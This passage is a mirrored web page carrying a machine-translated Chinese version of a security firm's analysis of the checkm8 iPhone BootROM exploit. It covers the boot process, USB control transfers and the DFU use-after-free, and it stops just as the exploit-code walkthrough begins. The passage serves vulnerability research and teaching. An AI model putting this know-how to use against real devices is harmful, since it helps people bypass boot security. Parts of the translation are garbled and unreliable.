<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ–ï¸ ğŸ˜Ÿ ğŸ—œï¸ checkm8æ¼æ´åˆ©ç”¨çš„æŠ€æœ¯åˆ†æ ğŸš´ğŸ¾ ğŸ¦ ğŸŒŒ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="æ‚¨å¾ˆæœ‰å¯èƒ½å·²ç»å¬è¯´è¿‡è€¸äººå¬é—»çš„checkm8æ”»å‡»ï¼Œè¯¥æ¼æ´åœ¨åŒ…æ‹¬iPhone Xåœ¨å†…BootROMå¤§å¤šæ•°iDevicesçš„BootROMä½¿ç”¨äº†ä¸å¯æ¢å¤çš„æ¼æ´iPhone X åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†å¯¹æ¼æ´åˆ©ç”¨è¿›è¡ŒæŠ€æœ¯åˆ†æï¼Œå¹¶ç ”ç©¶æ¼æ´çš„åŸå› ã€‚ ä»»ä½•æœ‰å…´è¶£çš„äºº-æ¬¢è¿å¤§å®¶åˆ‡å…¥ï¼ 


 æ‚¨å¯ä»¥åœ¨æ­¤å¤„é˜…è¯»è¯¥æ–‡ç« çš„è‹±æ–‡...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>checkm8æ¼æ´åˆ©ç”¨çš„æŠ€æœ¯åˆ†æ</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/471668/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p>æ‚¨å¾ˆæœ‰å¯èƒ½å·²ç»å¬è¯´è¿‡è€¸äººå¬é—»çš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">checkm8</a>æ”»å‡»ï¼Œè¯¥æ¼æ´åœ¨åŒ…æ‹¬<code>iPhone X</code>åœ¨å†…<code>BootROM</code>å¤§å¤šæ•°iDevicesçš„<code>BootROM</code>ä½¿ç”¨äº†ä¸å¯æ¢å¤çš„æ¼æ´<code>iPhone X</code> åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†å¯¹æ¼æ´åˆ©ç”¨è¿›è¡ŒæŠ€æœ¯åˆ†æï¼Œå¹¶ç ”ç©¶æ¼æ´çš„åŸå› ã€‚ ä»»ä½•æœ‰å…´è¶£çš„äºº-æ¬¢è¿å¤§å®¶åˆ‡å…¥ï¼ </p><a name="habracut"></a><br><p> æ‚¨å¯ä»¥åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ­¤å¤„</a>é˜…è¯»è¯¥æ–‡ç« çš„è‹±æ–‡ç‰ˆã€‚ </p><br><h2 id="vvedenie"> å¼•è¨€ </h2><br><p> é¦–å…ˆï¼Œæˆ‘ä»¬å°†ç®€è¦æè¿°iDeviceå¼•å¯¼è¿‡ç¨‹ï¼Œå¹¶æ‰¾å‡º<code>BootROM</code>åœ¨å…¶ä¸­çš„ä½ç½®ï¼ˆä¹Ÿå¯ä»¥ç§°ä¸º<code>SecureROM</code> ï¼‰ä»¥åŠä¸ºä»€ä¹ˆéœ€è¦å®ƒã€‚ æœ‰å…³æ­¤çš„è¯¦ç»†ä¿¡æ¯<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åœ¨è¿™é‡Œ</a> ã€‚ ç®€åŒ–çš„å¯åŠ¨è¿‡ç¨‹å¯ä»¥è¡¨ç¤ºå¦‚ä¸‹ï¼š </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p>  <code>BootROM</code>æ˜¯å¤„ç†å™¨æ‰§è¡Œçš„ç¬¬ä¸€ä»¶äº‹ã€‚  <code>BootROM</code>çš„ä¸»è¦ä»»åŠ¡ï¼š </p><br><ul><li> å¹³å°çš„åˆå§‹åŒ–ï¼ˆè®¾ç½®å¿…è¦çš„å¹³å°å¯„å­˜å™¨ï¼Œåˆå§‹åŒ–<code>CPU</code>ç­‰ï¼‰ </li><li> éªŒè¯å¹¶å°†æ§åˆ¶æƒè½¬ç§»åˆ°ä¸‹ä¸€ä¸ªåŠ è½½é˜¶æ®µ <br><ul><li>  <code>BootROM</code>æ”¯æŒ<code>IMG3/IMG4</code>æ˜ åƒçš„è§£æ </li><li>  <code>BootROM</code>å¯ä»¥è®¿é—®ç”¨äºè§£å¯†æ˜ åƒçš„<code>GID</code>å¯†é’¥ </li><li> ä¸ºäº†æ£€æŸ¥å›¾åƒï¼Œ <code>Apple</code>å…¬ç”¨å¯†é’¥å†…ç½®åœ¨<code>BootROM</code> ï¼Œå¹¶ä¸”å…·æœ‰ä½¿ç”¨åŠ å¯†çš„å¿…è¦åŠŸèƒ½ã€‚ </li></ul></li><li> å¦‚æœæ— æ³•è¿›ä¸€æ­¥ä¸‹è½½ï¼Œè¯·æ¢å¤è®¾å¤‡ï¼ˆ <code>Device Firmware Update</code> ï¼Œ <code>DFU</code> ï¼‰ </li></ul><br><p>  <code>BootROM</code>ä½“ç§¯éå¸¸å°ï¼Œå¯ä»¥ç§°ä¸º<code>iBoot</code>çš„ç²¾ç®€ç‰ˆï¼Œå› ä¸ºå®ƒä»¬å…±äº«å¤§å¤šæ•°ç³»ç»Ÿä»£ç å’Œåº“ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸<code>iBoot</code>ä¸åŒï¼Œ <code>BootROM</code>æ— æ³•æ›´æ–°ã€‚ åˆ¶é€ è®¾å¤‡æ—¶ï¼Œå®ƒè¢«æ”¾ç½®åœ¨å†…éƒ¨åªè¯»å­˜å‚¨å™¨ä¸­ã€‚  <code>BootROM</code>æ˜¯å¼•å¯¼é“¾ä¿¡ä»»çš„ç¡¬ä»¶æ ¹ã€‚ å®ƒä¸­çš„æ¼æ´å¯èƒ½ä½¿æ‚¨å¯ä»¥æ§åˆ¶è¿›ä¸€æ­¥çš„ä¸‹è½½è¿‡ç¨‹ï¼Œå¹¶åœ¨è®¾å¤‡ä¸Šæ‰§è¡Œæœªç­¾åçš„ä»£ç ã€‚ </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="poyavlenie-checkm8">  checkm8çš„å¤–è§‚ </h2><br><p>  <code>checkm8</code>æ¼æ´å·²ç”±å…¶ä½œè€…<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">axi0mX</a>äº2019å¹´9æœˆ27æ—¥æ·»åŠ åˆ°<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfu</a>å®ç”¨ç¨‹åºä¸­<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ã€‚</a>ç„¶åä»–<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å®£å¸ƒ</a>å…¶Twitterå¸æˆ·è¿›è¡Œ<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">äº†</a>æ›´æ–°ï¼Œå¹¶é™„æœ‰å¯¹è¯¥æ¼æ´çš„æè¿°å’Œå…¶ä»–ä¿¡æ¯ã€‚ æ‚¨å¯ä»¥ä»çº¿ç¨‹ä¸­å‘ç°ä½œè€…åœ¨2018å¹´å¤å­£çš„<code>iBoot</code> for <code>iOS 12 beta</code>çš„è¡¥ä¸å‘å¸ƒ<code>iBoot</code>å‘ç°äº†<code>USB</code>ä»£ç ä¸­çš„<code>use-after-free</code>æ¼æ´ã€‚ å¦‚å‰æ‰€è¿°ï¼Œ <code>BootROM</code>å’Œ<code>iBoot</code>æœ‰å¾ˆå¤šé€šç”¨ä»£ç ï¼ŒåŒ…æ‹¬<code>USB</code>ä»£ç ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ­¤æ¼æ´ä¹Ÿä¸<code>BootROM</code>ç›¸å…³çš„åŸå› ã€‚ </p><br><p> ä»æ¼æ´åˆ©ç”¨ä»£ç è¿˜å¯ä»¥çœ‹å‡ºï¼Œè¯¥æ¼æ´æ˜¯åœ¨<code>DFU</code>åˆ©ç”¨çš„ã€‚ åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå¯ä»¥é€šè¿‡<code>USB</code>å°†ç­¾åçš„å›¾åƒä¼ è¾“åˆ°è®¾å¤‡ï¼Œéšåå°†å…¶ä¸‹è½½ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæ›´æ–°å¤±è´¥ï¼Œåˆ™å¯èƒ½éœ€è¦è¿˜åŸè®¾å¤‡ã€‚ </p><br><p> åœ¨åŒä¸€å¤©ï¼Œ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">littlelailo</a>æŠ¥å‘Šè¯´ä»–åœ¨3æœˆå‘ç°äº†æ­¤æ¼æ´ï¼Œå¹¶å°†å…¶æè¿°å‘å¸ƒåœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">apollo.txt</a>æ–‡ä»¶ä¸­ã€‚ è¯¥æè¿°ä¸<code>checkm8</code>ä»£ç ä¸­å‘ç”Ÿçš„æƒ…å†µç›¸å¯¹åº”ï¼Œä½†æœªå®Œå…¨é˜æ˜æ¼æ´åˆ©ç”¨çš„ç»†èŠ‚ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å†³å®šå†™è¿™ç¯‡æ–‡ç« ï¼Œå¹¶æè¿°æ“ä½œçš„æ‰€æœ‰ç»†èŠ‚ï¼Œç›´åˆ°åœ¨<code>BootROM</code>åŒ…æ‹¬<code>BootROM</code>æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ä¸ºæ­¢ã€‚ </p><br><p> æˆ‘ä»¬æ ¹æ®ä¹‹å‰æåˆ°çš„ææ–™ä»¥åŠ2018å¹´2æœˆæ³„æ¼çš„<code>iBoot/SecureROM</code>æºä»£ç è¿›è¡Œäº†æ¼æ´åˆ©ç”¨åˆ†æã€‚ æˆ‘ä»¬è¿˜ä½¿ç”¨äº†åœ¨æˆ‘ä»¬çš„æµ‹è¯•è®¾å¤‡<code>iPhone 7</code> ï¼ˆ <code>CPID:8010</code> ï¼‰ä¸Šé€šè¿‡å®éªŒè·å¾—çš„æ•°æ®ã€‚ ä½¿ç”¨<code>checkm8</code>æˆ‘ä»¬ä»å…¶ä¸­åˆ é™¤äº†<code>SecureROM</code>å’Œ<code>SecureRAM</code>è½¬å‚¨ï¼Œè¿™æœ‰åŠ©äºæˆ‘ä»¬è¿›è¡Œåˆ†æã€‚ </p><br><h2 id="neobhodimye-znaniya-o-usb"> åŸºæœ¬çš„USBçŸ¥è¯† </h2><br><p> æ£€æµ‹åˆ°çš„æ¼æ´åœ¨<code>USB</code>ä»£ç ä¸­ï¼Œå› æ­¤éœ€è¦æœ‰å…³æ­¤æ¥å£çš„ä¸€äº›çŸ¥è¯†ã€‚ æ‚¨å¯ä»¥åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ­¤å¤„</a>é˜…è¯»å®Œæ•´çš„è§„èŒƒï¼Œä½†å†…å®¹å¾ˆå¤šã€‚  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">NutShellä¸­çš„USB</a>æ˜¯ä¸€ç§å‡ºè‰²çš„ææ–™ï¼Œè¶³ä»¥è¿›ä¸€æ­¥ç†è§£ã€‚ è¿™é‡Œæˆ‘ä»¬åªç»™å‡ºæœ€å¿…è¦çš„ã€‚ </p><br><p>  <code>USB</code>æ•°æ®ä¼ è¾“æœ‰å¤šç§ç±»å‹ã€‚  <code>DFU</code>ä»…ä½¿ç”¨â€œ <code>Control Transfers</code>æ¨¡å¼ï¼ˆæ‚¨å¯ä»¥<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åœ¨æ­¤å¤„</a>é˜…è¯»æœ‰å…³å†…å®¹ï¼‰ã€‚ æ­¤æ¨¡å¼ä¸‹çš„æ¯ä¸ªäº‹åŠ¡éƒ½åŒ…æ‹¬ä¸‰ä¸ªé˜¶æ®µï¼š </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> -åœ¨æ­¤é˜¶æ®µï¼Œå°†å‘é€<code>SETUP</code>æ•°æ®åŒ…ï¼Œè¯¥æ•°æ®åŒ…åŒ…å«ä»¥ä¸‹å­—æ®µï¼š <br><ul><li>  <code>bmRequestType</code>æè¿°è¯·æ±‚çš„æ–¹å‘ï¼Œç±»å‹å’Œæ¥æ”¶è€… </li><li>  <code>bRequest</code>ç¡®å®šå‘å‡ºå“ªä¸ªè¯·æ±‚ </li><li>  <code>wValue</code> ï¼Œ <code>wIndex</code>æ ¹æ®è¯·æ±‚ï¼Œå¯ä»¥å¯¹å®ƒä»¬è¿›è¡Œä¸åŒçš„è§£é‡Š </li><li>  <code>wLength</code> <code>Data Stage</code>ä¸­æ¥æ”¶/å‘é€çš„æ•°æ®çš„é•¿åº¦ </li></ul></li><li>  <code>Data Stage</code> -å‘ç”Ÿæ•°æ®ä¼ è¾“çš„å¯é€‰é˜¶æ®µã€‚ æ ¹æ®å‰ä¸€é˜¶æ®µçš„<code>SETUP</code>æ•°æ®åŒ…ï¼Œè¿™å¯èƒ½æ˜¯ä»ä¸»æœºå‘è®¾å¤‡å‘é€æ•°æ®ï¼ˆ <code>OUT</code> ï¼‰ï¼Œåä¹‹äº¦ç„¶ï¼ˆ <code>IN</code> ï¼‰ã€‚ æ•°æ®æŒ‰å°éƒ¨åˆ†å‘é€ï¼ˆå¯¹äº<code>Apple DFU</code> ï¼Œä¸º0x40å­—èŠ‚ï¼‰ã€‚ <br><ul><li> å½“ä¸»æœºè¦ä¼ è¾“ä¸‹ä¸€æ‰¹æ•°æ®æ—¶ï¼Œå®ƒå°†å‘é€ä¸€ä¸ª<code>OUT</code>ä»¤ç‰Œï¼Œç„¶åå‘é€æ•°æ®æœ¬èº«ã€‚ </li><li> å½“ä¸»æœºå‡†å¤‡å¥½ä»è®¾å¤‡æ¥æ”¶æ•°æ®æ—¶ï¼Œå®ƒä¼šå‘é€ä¸€ä¸ª<code>IN</code>ä»¤ç‰Œï¼Œä»¥å“åº”è®¾å¤‡å‘é€æ•°æ®ã€‚ </li></ul></li><li>  <code>Status Stage</code> -æŠ¥å‘Šæ•´ä¸ªäº¤æ˜“çŠ¶æ€çš„æœ€åé˜¶æ®µã€‚ <br><ul><li> å¯¹äº<code>OUT</code>è¯·æ±‚ï¼Œä¸»æœºå‘é€ä¸€ä¸ª<code>IN</code>ä»¤ç‰Œï¼Œä½œä¸ºå“åº”ï¼Œè®¾å¤‡åº”å‘é€é›¶é•¿åº¦çš„æ•°æ®åŒ…ã€‚ </li><li> å¯¹äº<code>IN</code>è¯·æ±‚ï¼Œä¸»æœºå‘é€<code>OUT</code>ä»¤ç‰Œå’Œé›¶é•¿åº¦æ•°æ®åŒ…ã€‚ </li></ul></li></ul><br><p> ä¸‹å›¾æ˜¾ç¤ºäº†<code>OUT</code>å’Œ<code>IN</code>æŸ¥è¯¢ã€‚ æˆ‘ä»¬æœ‰æ„ä»æè¿°å’Œäº¤äº’æ–¹æ¡ˆä¸­åˆ é™¤äº†<code>ACK</code> ï¼Œ <code>NACK</code>å’Œå…¶ä»–æ¡æ‰‹åŒ…ï¼Œå› ä¸ºå®ƒä»¬åœ¨æ¼æ´åˆ©ç”¨ç¨‹åºæœ¬èº«ä¸­æ²¡æœ‰ç‰¹æ®Šä½œç”¨ã€‚ </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analiz-apollotxt"> åˆ†æapollo.txt </h2><br><p> æˆ‘ä»¬é€šè¿‡åˆ†æ<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">apollo.txt</a>æ–‡æ¡£ä¸­çš„æ¼æ´å¼€å§‹åˆ†æã€‚ å®ƒæè¿°äº†<code>DFU</code>æ¨¡å¼çš„ç®—æ³•ï¼š </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li> å½“USBå¼€å§‹é€šè¿‡dfuè·å–å›¾åƒæ—¶ï¼Œdfuæ³¨å†Œä¸€ä¸ªæ¥å£æ¥å¤„ç†æ‰€æœ‰å‘½ä»¤ï¼Œå¹¶ä¸ºè¾“å…¥å’Œè¾“å‡ºåˆ†é…ä¸€ä¸ªç¼“å†²åŒºã€‚ </li><li> å¦‚æœæ‚¨å°†æ•°æ®å‘é€åˆ°dfuï¼Œåˆ™è®¾ç½®åŒ…å°†ç”±ä¸»ä»£ç å¤„ç†ï¼Œç„¶åè°ƒå‡ºæ¥å£ä»£ç  </li><li> æ¥å£ä»£ç éªŒè¯wLengthçŸ­äºè¾“å…¥è¾“å‡ºç¼“å†²åŒºçš„é•¿åº¦ï¼Œå¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œå®ƒå°†ä½¿ç”¨æŒ‡å‘è¾“å…¥è¾“å‡ºç¼“å†²åŒºçš„æŒ‡é’ˆæ›´æ–°ä½œä¸ºå‚æ•°ä¼ é€’çš„æŒ‡é’ˆ </li><li> ç„¶åè¿”å›wLengthï¼Œè¿™æ˜¯å®ƒè¦æ¥æ”¶åˆ°ç¼“å†²åŒºçš„é•¿åº¦ </li><li> ç„¶åï¼ŒUSBä¸»ä»£ç ä½¿ç”¨é•¿åº¦æ›´æ–°å…¨å±€å˜é‡ï¼Œå¹¶å‡†å¤‡å¥½æ¥æ”¶æ•°æ®åŒ… </li><li> å¦‚æœæ¥æ”¶åˆ°æ•°æ®åŒ…ï¼Œåˆ™é€šè¿‡ä½œä¸ºå‚æ•°ä¼ é€’çš„æŒ‡é’ˆå°†å…¶å†™å…¥è¾“å…¥è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶ä½¿ç”¨å¦ä¸€ä¸ªå…¨å±€å˜é‡æ¥è·Ÿè¸ªå·²ç»æ¥æ”¶äº†å¤šå°‘å­—èŠ‚ </li><li> å¦‚æœæ¥æ”¶åˆ°æ‰€æœ‰æ•°æ®ï¼Œåˆ™å†æ¬¡è°ƒç”¨ç‰¹å®šäºdfuçš„ä»£ç ï¼Œç„¶åç»§ç»­å°†è¾“å…¥è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¤åˆ¶åˆ°ä»¥åä»ä¸­å¼•å¯¼æ˜ åƒçš„å†…å­˜ä½ç½® </li><li> ä¹‹åï¼Œusbä»£ç å°†é‡ç½®æ‰€æœ‰å˜é‡ï¼Œç„¶åç»§ç»­å¤„ç†æ–°è½¯ä»¶åŒ… </li><li> å¦‚æœdfué€€å‡ºï¼Œåˆ™é‡Šæ”¾è¾“å…¥è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶ä¸”å¦‚æœæ˜ åƒè§£æå¤±è´¥ï¼Œåˆ™bootromé‡æ–°è¾“å…¥dfu </li></ol><br></blockquote><p> é¦–å…ˆï¼Œæˆ‘ä»¬å°†æè¿°çš„æ­¥éª¤ä¸<code>iBoot</code>æºä»£ç è¿›è¡Œäº†æ¯”è¾ƒã€‚ ç”±äºæˆ‘ä»¬æ— æ³•åœ¨æœ¬æ–‡ä¸­ä½¿ç”¨æ³„æ¼çš„æºä»£ç ç‰‡æ®µï¼Œå› æ­¤æˆ‘ä»¬å°†åœ¨<code>IDA</code>æ˜¾ç¤ºé€šè¿‡<code>iPhone 7</code> <code>SecureROM</code>åå‘å·¥ç¨‹è·å¾—çš„ä¼ªä»£ç ã€‚ æ‚¨å¯ä»¥è½»æ¾æ‰¾åˆ°<code>iBoot</code>çš„æºä»£ç å¹¶è¿›è¡Œå¯¼èˆªã€‚ </p><br><p> åˆå§‹åŒ–<code>DFU</code>æ¨¡å¼åï¼Œå°†åˆ†é…<code>IO</code>ç¼“å†²åŒºå¹¶æ³¨å†Œ<code>USB</code>æ¥å£ä»¥å¤„ç†å¯¹<code>DFU</code>è¯·æ±‚ï¼š </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p> å½“<code>SETUP</code>è¯·æ±‚æ•°æ®åŒ…åˆ°è¾¾<code>DFU</code> ï¼Œå°†è°ƒç”¨ç›¸åº”çš„æ¥å£å¤„ç†ç¨‹åºã€‚ å¦‚æœæˆåŠŸæ‰§è¡Œ<code>OUT</code>è¯·æ±‚ï¼ˆä¾‹å¦‚ï¼Œåœ¨å›¾åƒä¼ è¾“æœŸé—´ï¼‰ï¼Œåˆ™å¤„ç†ç¨‹åºå¿…é¡»è¿”å›ç”¨äºäº‹åŠ¡çš„<code>IO</code>ç¼“å†²åŒºçš„åœ°å€ä»¥åŠå®ƒå¸Œæœ›é€šè¿‡æŒ‡é’ˆæ¥æ”¶çš„æ•°æ®å¤§å°ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¼“å†²åŒºåœ°å€å’ŒæœŸæœ›æ•°æ®çš„å¤§å°å­˜å‚¨åœ¨å…¨å±€å˜é‡ä¸­ã€‚ </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p>  <code>DFU</code>çš„æ¥å£å¤„ç†ç¨‹åºå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ å¦‚æœè¯·æ±‚æ­£ç¡®ï¼Œé‚£ä¹ˆæŒ‡é’ˆå°†è¿”å›åœ¨<code>DFU</code>åˆå§‹åŒ–é˜¶æ®µåˆ†é…çš„<code>IO</code>ç¼“å†²åŒºçš„åœ°å€ä»¥åŠä»<code>SETUP</code>æ•°æ®åŒ…ä¸­è·å–çš„é¢„æœŸæ•°æ®çš„é•¿åº¦ã€‚ </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p> åœ¨<code>Data Stage</code>æ¯æ¡æ•°æ®å†™å…¥<code>IO</code>ç¼“å†²åŒºï¼Œç„¶å<code>IO</code>ç¼“å†²åŒºçš„åœ°å€è¢«ç§»ä½å¹¶æ›´æ–°æ¥æ”¶åˆ°çš„æ•°æ®çš„è®¡æ•°å™¨ã€‚ æ¥æ”¶åˆ°æ‰€æœ‰é¢„æœŸæ•°æ®åï¼Œå°†è°ƒç”¨æ¥å£æ•°æ®å¤„ç†ç¨‹åºï¼Œå¹¶æ¸…é™¤å…¨å±€ä¼ è¾“çŠ¶æ€ã€‚ </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p> åœ¨<code>DFU</code>æ•°æ®å¤„ç†ç¨‹åºä¸­ï¼Œå°†æ¥æ”¶åˆ°çš„æ•°æ®ç§»åˆ°å°†ç»§ç»­ä¸‹è½½çš„å­˜å‚¨åŒºã€‚ ä»<code>iBoot</code>æºä»£ç æ¥çœ‹ï¼Œ <code>Apple</code>æ­¤å­˜å‚¨åŒºç§°ä¸º<code>INSECURE_MEMORY</code> ã€‚ </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p> é€€å‡º<code>DFU</code>æ¨¡å¼æ—¶ï¼Œå…ˆå‰åˆ†é…çš„<code>IO</code>ç¼“å†²åŒºå°†è¢«é‡Šæ”¾ã€‚ å¦‚æœåœ¨<code>DFU</code>æ¨¡å¼ä¸‹æˆåŠŸæ¥æ”¶åˆ°å›¾åƒï¼Œå°†å¯¹å…¶è¿›è¡Œæ£€æŸ¥å’ŒåŠ è½½ã€‚ å¦‚æœåœ¨<code>DFU</code>æ¨¡å¼çš„æ“ä½œè¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä¸€äº›é”™è¯¯ï¼Œæˆ–è€…æ— æ³•åŠ è½½ç”Ÿæˆçš„å›¾åƒï¼Œåˆ™<code>DFU</code>å°†é‡æ–°åˆå§‹åŒ–ï¼Œå¹¶ä¸”ä¸€åˆ‡å°†é‡æ–°å¼€å§‹ã€‚ </p><br><p> åœ¨æ‰€æè¿°çš„ç®—æ³•ä¸­å­˜åœ¨æ— ç”¨<code>use-after-free</code>æ¼æ´ã€‚ å¦‚æœåœ¨å¼•å¯¼æ—¶å‘é€<code>SETUP</code>æ•°æ®åŒ…å¹¶è·³è¿‡<code>Data Stage</code>å®Œæˆäº‹åŠ¡ï¼Œåˆ™åœ¨é‡æ–°è¿›å…¥<code>DFU</code>å‘¨æœŸåï¼Œå…¨å±€çŠ¶æ€å°†ä¿æŒåˆå§‹åŒ–ï¼Œå¹¶ä¸”æˆ‘ä»¬å°†èƒ½å¤Ÿå†™å…¥åœ¨å…ˆå‰<code>DFU</code>è¿­ä»£ä¸­åˆ†é…çš„<code>IO</code>ç¼“å†²åŒºçš„åœ°å€ã€‚ </p><br><p> å¤„ç†äº†â€œ <code>use-after-free</code>æ¼æ´åï¼Œæˆ‘ä»¬æƒ³çŸ¥é“ï¼šå¦‚ä½•åœ¨<code>DFU</code>çš„ä¸‹ä¸€æ¬¡è¿­ä»£æœŸé—´è¦†ç›–æŸäº›å†…å®¹ï¼Ÿ æ¯•ç«Ÿï¼Œåœ¨é‡æ–°åˆå§‹åŒ–<code>DFU</code>ä¹‹å‰ï¼Œå¿…é¡»é‡Šæ”¾æ‰€æœ‰å…ˆå‰åˆ†é…çš„èµ„æºï¼Œå¹¶ä¸”æ–°è¿­ä»£ä¸­çš„å†…å­˜ä½ç½®åº”è¯¥å®Œå…¨ç›¸åŒã€‚ äº‹å®è¯æ˜ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªæœ‰è¶£ä¸”éå¸¸æ¼‚äº®çš„å†…å­˜æ³„æ¼é”™è¯¯ï¼Œè¯¥é”™è¯¯å…è®¸åˆ©ç”¨æ— ç”¨<code>use-after-free</code>æ¼æ´ï¼Œæˆ‘ä»¬å°†åœ¨åé¢è®¨è®ºã€‚ </p><br><h2 id="analiz-checkm8">  Checkm8åˆ†æ </h2><br><p> æˆ‘ä»¬ç›´æ¥è¿›è¡Œå¯¹<code>checkm8</code>åˆ©ç”¨çš„åˆ†æã€‚ ä¸ºç®€å•èµ·è§ï¼Œæˆ‘ä»¬å°†åˆ†æ<code>iPhone 7</code>æ¼æ´çš„ä¿®æ”¹ç‰ˆï¼Œå…¶ä¸­åˆ é™¤äº†ä¸å…¶ä»–å¹³å°å…³è”çš„ä»£ç ï¼Œæ›´æ”¹äº†<code>USB</code>è¯·æ±‚çš„é¡ºåºå’Œç±»å‹ï¼Œè€Œä¸ä¼šä¸¢å¤±è¯¥æ¼æ´ã€‚ åŒæ ·åœ¨æ­¤ç‰ˆæœ¬ä¸­ï¼Œåˆ é™¤äº†æ„é€ 